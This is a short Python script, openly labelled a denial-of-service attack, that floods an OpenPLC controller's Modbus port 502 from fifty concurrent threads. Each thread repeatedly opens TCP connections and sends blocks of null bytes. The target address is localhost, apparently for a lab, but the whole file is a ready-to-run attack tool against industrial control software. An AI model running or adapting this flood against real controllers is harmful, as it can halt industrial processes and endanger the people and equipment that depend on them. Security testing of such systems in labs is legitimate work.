import socket
import threading

PLC_IP = "127.0.0.1"
PLC_PORT = 502

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((PLC_IP, PLC_PORT))
            # Keep the connection open
            s.send(b"\x00" * 4096)
        except:
            pass

print("[+] Starting DoS attack against OpenPLC (port 502)")

# Launch many concurrent threads
for i in range(50):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

# Keep main thread alive
while True:
    pass
